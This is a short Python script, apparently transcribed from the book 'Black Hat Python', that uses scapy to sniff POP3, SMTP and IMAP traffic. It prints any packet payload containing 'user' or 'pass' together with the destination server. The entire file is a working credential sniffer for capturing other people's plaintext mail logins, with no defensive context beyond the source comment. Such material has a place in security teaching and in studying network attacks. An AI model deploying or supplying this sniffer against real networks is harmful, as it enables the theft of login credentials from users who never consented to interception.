#Fonte: Livro Black Hat Python, pag.71
from scapy.all import *

def packet_callback(packet): #1
    if packet[TCP].payload: #2
        mail_packet = str(packet[TCP].payload) #3
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower(): #4
            print "[*] Server: %s" % packet[IP].dst #5
            print "[*] %s" % packet[TCP].payload #6

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0) #7